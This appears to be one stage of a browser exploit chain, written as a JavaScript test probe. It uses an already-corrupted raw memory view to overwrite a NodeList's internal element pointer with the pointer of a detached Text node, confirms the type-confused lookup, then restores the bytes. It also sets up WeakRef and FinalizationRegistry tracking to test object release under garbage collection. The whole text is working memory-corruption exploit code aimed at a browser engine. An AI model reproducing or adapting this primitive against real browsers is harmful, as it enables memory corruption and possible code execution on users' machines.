// Match the pointer write and Text detachment, but restore the list before GC.
var held = window.__fw14NodeState;
var result;
var phase = "preflight";
var changed = false;
var restored = false;
var view, index, original;
try {
  if (!held || held.list.item(0) !== held.firstNode ||
      held.textNode.nodeType !== 3 || !held.textNode.parentNode ||
      held.list.length !== 8191)
    throw new Error("missing_valid_held_list");
  view = held.view;
  index = held.index;
  original = held.elementBytes;
  var replacement = held.textBytes;
  for (var i = 0; i < 8; i++)
    if (view[index + i] !== original[i]) throw new Error("stale_vector_bytes");
  if (replacement.join(",") === original.join(","))
    throw new Error("same_pointer_bytes");
  var list = held.list;
  var textNode = held.textNode;
  var parent = textNode.parentNode;
  var events = [];
  var registry = new FinalizationRegistry(function (label) { events.push(label); });
  var weak = new WeakRef(list);
  registry.register(list, "list");
  phase = "detach_text";
  parent.removeChild(textNode);
  var detached = textNode.parentNode === null && textNode.data === "text-probe";
  if (!detached) throw new Error("text_not_detached");
  phase = "temporary_substitution";
  if (api && typeof api.markSync === "function") api.markSync("list_sham_before_write");
  changed = true;
  for (var w = 0; w < 8; w++) view[index + w] = replacement[w];
  var matchedText = list.item(0) === textNode;
  phase = "restore_list_pointer";
  for (var x = 0; x < 8; x++) view[index + x] = original[x];
  changed = false;
  restored = list.item(0) === held.firstNode;
  for (var b = 0; b < 8; b++)
    if (view[index + b] !== original[b]) restored = false;
  if (!matchedText || !restored) throw new Error("sham_identity_or_restore_failed");
  if (api && typeof api.markSync === "function") api.markSync("list_sham_before_release");
  window.__fw14RefcountState = {
    textNode: textNode, weak: weak, registry: registry,
    events: events, mode: "sham", detached: detached
  };
  held.list = null;
  window.__fw14NodeState = null;
  list = null;
  held = null;
  result = { id: "list_release_sham", status: "pass", details: {
    detached: detached, matched_text: matchedText,
    restored: restored, mode: "sham"
  } };
} catch (error) {
  if (changed && view && original)
    for (var y = 0; y < 8; y++) view[index + y] = original[y];
  result = { id: "list_release_sham", status: "error", details: {
    phase: phase, changed: changed, restored: restored,
    error: String(error).slice(0, 200)
  } };
}
return [result];
